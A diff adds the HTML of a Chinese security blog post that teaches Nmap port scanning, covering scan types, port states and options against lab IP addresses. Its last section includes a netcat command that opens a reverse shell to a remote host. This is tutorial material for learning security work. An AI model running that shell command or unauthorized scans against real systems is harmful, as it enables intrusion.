@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>web安全之Nmap使用 | Hexo</title>
+  <meta name="description" content="NmapNmap是被专业人员广泛使用的一款功能全面的端口扫描工具 安装kali上已经自带，windows上去官网下载相关的安装包，centos就直接 yum install nmap 简单入门刚开始使用的时候可能会因为信息量太大无从下手，最简单的使用就是 nmap your-ip（域名） 就可以扫描出其对外开放的服务。 123456789101112nmap 192.168.31.13#基本格式，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web安全之Nmap使用">
+<meta property="og:url" content="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BNMap%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="风景这边独好">
+<meta property="og:description" content="NmapNmap是被专业人员广泛使用的一款功能全面的端口扫描工具 安装kali上已经自带，windows上去官网下载相关的安装包，centos就直接 yum install nmap 简单入门刚开始使用的时候可能会因为信息量太大无从下手，最简单的使用就是 nmap your-ip（域名） 就可以扫描出其对外开放的服务。 123456789101112nmap 192.168.31.13#基本格式，">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-12-31T08:01:51.000Z">
+<meta property="article:modified_time" content="2021-06-29T11:03:25.948Z">
+<meta property="article:author" content="Ye-Jun">
+<meta property="article:tag" content="web安全、Nmap">
+<meta name="twitter:card" content="summary">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BNMap%E4%BD%BF%E7%94%A8/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="风景这边独好" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/yejuns" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">厨师长</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">程序员 &amp; Designer</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> nanjing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/yejuns" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/2020-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" rel="tag">2020 年度总结</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android%E3%80%81%E9%80%86%E5%90%91/" rel="tag">Android、逆向</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSRF-%E3%80%81%E6%94%BB%E5%87%BB/" rel="tag">CSRF 、攻击</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux%E3%80%81%E5%AE%89%E5%85%A8/" rel="tag">Linux、安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SqlMap/" rel="tag">SqlMap</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/bwapp%E3%80%81injection/" rel="tag">bwapp、injection</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fiddler/" rel="tag">fiddler,</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo%E4%BD%BF%E7%94%A8/" rel="tag">hexo使用</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/javaScript/" rel="tag">javaScript</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E3%80%81php%E3%80%81%E6%B3%A8%E5%85%A5%E3%80%81RCE/" rel="tag">web、php、注入、RCE</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8%E3%80%81Nmap/" rel="tag">web安全、Nmap</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows%EF%BC%8C%E6%8C%87%E4%BB%A4/" rel="tag">windows，指令</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/" rel="tag">xss、攻击</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss%E3%80%81%E6%94%BB%E5%87%BB%E3%80%81%E8%A0%95%E8%99%AB/" rel="tag">xss、攻击、蠕虫</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss%E3%80%81%E9%9D%B6%E5%9C%BA%E3%80%81%E9%A2%98%E8%A7%A3/" rel="tag">xss、靶场、题解</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B9%89%E5%B7%A5%E6%97%85%E8%A1%8C/" rel="tag">义工旅行</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag">伪协议、文件包含</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E3%80%81OOB%E6%B3%A8%E5%85%A5/" rel="tag">堆叠注入、OOB注入</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B5%8B%E8%AF%95/" rel="tag">测试</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/2020-%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/" style="font-size: 13px;">2020 年度总结</a> <a href="/tags/Android%E3%80%81%E9%80%86%E5%90%91/" style="font-size: 13px;">Android、逆向</a> <a href="/tags/CSRF-%E3%80%81%E6%94%BB%E5%87%BB/" style="font-size: 13px;">CSRF 、攻击</a> <a href="/tags/Linux%E3%80%81%E5%AE%89%E5%85%A8/" style="font-size: 13px;">Linux、安全</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 13.5px;">SQL注入</a> <a href="/tags/SqlMap/" style="font-size: 13.5px;">SqlMap</a> <a href="/tags/bwapp%E3%80%81injection/" style="font-size: 13px;">bwapp、injection</a> <a href="/tags/fiddler/" style="font-size: 13px;">fiddler,</a> <a href="/tags/hexo%E4%BD%BF%E7%94%A8/" style="font-size: 13px;">hexo使用</a> <a href="/tags/javaScript/" style="font-size: 13px;">javaScript</a> <a href="/tags/web%E3%80%81php%E3%80%81%E6%B3%A8%E5%85%A5%E3%80%81RCE/" style="font-size: 13px;">web、php、注入、RCE</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 13px;">web安全</a> <a href="/tags/web%E5%AE%89%E5%85%A8%E3%80%81Nmap/" style="font-size: 13px;">web安全、Nmap</a> <a href="/tags/windows%EF%BC%8C%E6%8C%87%E4%BB%A4/" style="font-size: 13px;">windows，指令</a> <a href="/tags/xss%E3%80%81%E6%94%BB%E5%87%BB/" style="font-size: 14px;">xss、攻击</a> <a href="/tags/xss%E3%80%81%E6%94%BB%E5%87%BB%E3%80%81%E8%A0%95%E8%99%AB/" style="font-size: 13.5px;">xss、攻击、蠕虫</a> <a href="/tags/xss%E3%80%81%E9%9D%B6%E5%9C%BA%E3%80%81%E9%A2%98%E8%A7%A3/" style="font-size: 13px;">xss、靶场、题解</a> <a href="/tags/%E4%B9%89%E5%B7%A5%E6%97%85%E8%A1%8C/" style="font-size: 13px;">义工旅行</a> <a href="/tags/%E4%BC%AA%E5%8D%8F%E8%AE%AE%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 13px;">伪协议、文件包含</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E3%80%81OOB%E6%B3%A8%E5%85%A5/" style="font-size: 13px;">堆叠注入、OOB注入</a> <a href="/tags/%E6%B5%8B%E8%AF%95/" style="font-size: 13px;">测试</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 13px;">计算机网络</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a><span class="archive-list-count">22</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">九月 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">十二月 2018</a><span class="archive-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/31/2020-summary/" class="title">2020-summary</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-31T13:50:32.000Z" itemprop="datePublished">2020-12-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/31/Ademo/" class="title">创建我的个人博客</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/" class="title">Linux 中的安全模型</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/31/SqlMap%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/" class="title">web安全之SqlMap</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2020/12/31/bwapp-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AFA1/" class="title">bwapp学习笔记-A1 Injection</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-web安全之NMap使用" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      web安全之Nmap使用
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BNMap%E4%BD%BF%E7%94%A8/" class="article-date">
+	  <time datetime="2020-12-31T08:01:51.000Z" itemprop="datePublished">2020-12-31</time>
+	</a>
+</span>
+        
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/web%E5%AE%89%E5%85%A8%E3%80%81Nmap/" rel="tag">web安全、Nmap</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BNMap%E4%BD%BF%E7%94%A8/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>kali上已经自带，windows上去官网下载相关的安装包，centos就直接 <code>yum install nmap</code></p>
+<h3 id="简单入门"><a href="#简单入门" class="headerlink" title="简单入门"></a>简单入门</h3><p>刚开始使用的时候可能会因为信息量太大无从下手，最简单的使用就是 <code>nmap your-ip（域名）</code> 就可以扫描出其对外开放的服务。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash">基本格式，会扫描该主机的所有端口</span></span><br><span class="line"></span><br><span class="line">nmap -p 8080 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash"> 判断指定ip是否开放指定端口</span> </span><br><span class="line"></span><br><span class="line">nmap  -p 22,21,80 192.168.31.13</span><br><span class="line">nmap  -p 22,21,80 192.168.31.1-253</span><br><span class="line"><span class="meta">#</span><span class="bash"> 增加端口和网段</span> </span><br><span class="line"></span><br><span class="line">nmap 192.168.31.1/24</span><br><span class="line"><span class="meta">#</span><span class="bash"> 扫描整个子网的端口，这个过程可能会比较久</span></span><br></pre></td></tr></table></figure>
+<h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><p>Nmap扫描相关端口后，会显示出各个端口的状态，一共有6种</p>
+<ol>
+<li>Open，开放状态（当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时，我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们就认为此端口开放了并且使用了TCP服务）</li>
+<li>Closed，关闭状态（TCP SYN类型的扫描，如果返回RST类型的报文，则端口处于管理状态。这里我们值得注意的是关闭的端口也是可访问的，只是没有上层的服务在监听这个端口）</li>
+<li>Filtered(过滤的)，由于报文无法到达指定的端口，nmap不能够决定端口的开放状态，这主要是由于网络或者主机安装了一些防火墙所导致</li>
+<li>Unfiltered(未被过滤的), 虽然可以访问到指定端口，但Nmap不能确定该端口是否处于开放状态。</li>
+<li>Open|filtered  Nmap认为指定端口处于开放状态或过滤状态，这种状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin，和xmas扫描类型</li>
+<li>Closed|filtered Nmap认为指定端口处于开放状态或未过滤状态，</li>
+</ol>
+<p>以下是一些例子</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nmap -O 192.168.31.13 -p 8080</span><br><span class="line"><span class="meta">#</span><span class="bash">操作系统检测（-O）</span></span><br><span class="line"></span><br><span class="line">nmap  -Pn 80 192.168.31.13</span><br><span class="line"><span class="meta">#</span><span class="bash"> 禁用主机检测（-Pn）,如果主机屏蔽了ping请求，Nmap可能会认为该主机没有开机。这将使得Nmap无法进行进一步检测，禁用Nmap的主机检测功能后。Nmap会认为目标主机已经开机并进行全套的检测工作</span></span><br><span class="line"></span><br><span class="line">nmap -A 192.168.31.13 -p 8080</span><br><span class="line"><span class="meta">#</span><span class="bash"> 强力检测选项（-A），Nmap将检测目标主机的下述信息</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 服务版本识别（-sV）；操作系统识别（-O）；脚本扫描（-sC）</span></span><br><span class="line"></span><br><span class="line">nmap -sT 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> TCP连接扫描（-sT）：指定这个选项后，程序将和目标主机的每个端口都进行完整的三次 握手。如果成功建立连接，则判定该端口是开放端口。由于在检测每个端口时都需要进行三次握手，所以这种扫描方式比较慢，而且扫描行为很可能被目标主机记录下来</span></span><br><span class="line"></span><br><span class="line">nmap -sS 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将使用 含有SYN标志位的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常 好。而且由于这种模式不会进行三次握手，所以是一种十分隐蔽的扫描方式</span></span><br><span class="line"></span><br><span class="line">namp -sN 192.168.31.1</span><br><span class="line">namp -sF 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash">TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位； FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><p><code>nmap -sU 192.168.1.1</code> <br><br>Nmap有多种TCP扫描方式，而UDP扫描仅有一种扫描方式（-sU）。虽然UDP扫描结果没有 TCP扫描结果的可靠度高，但渗透测试人员不能因此而轻视UDP扫描，毕竟UDP端口代表着 可能会有价值的服务端程序。但是UDP扫描的最大问题是性能问题。由干Linux内核限制1秒内最多发送一次ICMP Port Unreachable信息。按照这个速度，对一台主机的65536个UDP端口进行完整扫描，总耗时必 定会超过18个小时。</p>
+<p>优化方法主要是:</p>
+<ol>
+<li>进行并发的UDP扫描；</li>
+<li>优先扫描常用端口；</li>
+<li>在防火墙后面扫描；</li>
+<li>启用–host-timeout选项以跳过响应过慢的主机。</li>
+</ol>
+<p>假如我们需要找到目标主机开放了哪些 UDP端口。为提高扫描速度，我们仅扫描 53端口 （DNS）和161端口（SNMP）</p>
+<p>使用命令  <code>nmap -sU 192.168.56.103 -p 53,161</code></p>
+<h3 id="目标端口选项"><a href="#目标端口选项" class="headerlink" title="目标端口选项"></a>目标端口选项</h3><p>默认情况下，Nmap将从每个协议的常用端口中随机选择1000个端口进行扫描。其nmapservices文件对端口的命中率进行了排名。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-p端口范围：只扫描指定的端口。扫描1〜1024号端口，可设定该选项为–p	1-1024。扫描1 〜65535端口时，可使用-p-选项。</span><br><span class="line"></span><br><span class="line">-F（快速扫描）：将仅扫描100	个常用端口。</span><br><span class="line"></span><br><span class="line">-r（顺序扫描）：指定这个选项后，程序将从按照从小到大的顺序扫描端口。</span><br><span class="line"></span><br><span class="line">-top-ports &lt;1 or=&quot;&quot;	greater=&quot;&quot;&gt;：扫描nmap-services	里排名前N的端口。</span><br></pre></td></tr></table></figure>
+
+<p>Nmap还提供了脚本引擎功能（Nmap Scripting Engine，NSE）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65000 -sV 192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash">扫描目标ip的1-65000端口，并进行服务版本识别</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><p>由于Nmap中提供了Ncat功能，Ncat包含NetCat的所有功能</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 80       #监听本机的TCP80端口</span><br><span class="line">nc -nvv 192.168.x.x 80    #连到192.168.x.x的TCP80端口</span><br><span class="line"></span><br><span class="line">nc -e /bin/bash 192.168.0.1 33</span><br><span class="line"><span class="meta">#</span><span class="bash"> 绑定到192.168.0.1的33端口，并反弹一个自己的shell到远程主机</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BNMap%E4%BD%BF%E7%94%A8/" title="web安全之Nmap使用" target="_blank" rel="external">http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BNMap%E4%BD%BF%E7%94%A8/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/yejuns" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/yejuns" target="_blank"><span class="text-dark">厨师长</span><small class="ml-1x">程序员 &amp; Designer</small></a></h3>
+        <div>平凡的时间，不平凡的你我。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BCSRF/" title="web安全之CSRF"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BRCE%20/" title="web安全之RCE"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
